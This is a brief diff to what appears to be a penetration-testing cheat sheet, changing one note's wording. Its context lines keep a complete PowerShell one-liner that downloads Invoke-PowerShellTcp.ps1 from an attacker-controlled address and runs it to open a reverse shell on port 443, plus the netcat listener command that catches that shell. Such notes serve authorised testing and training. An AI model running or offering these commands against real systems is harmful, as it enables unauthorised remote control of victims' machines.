@@ -139,7 +139,7 @@ Command to download and execute a reverse-shell
 powershell iex (iwr -UseBasicParsing http://<my_ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IpAddress <my_ip> -Port 443
 ```
 
-**Note:** Remember to start the listener
+**Note:** Remember to start the listener using netcat
 ```
 nc64.exe -lvp 443
 ```
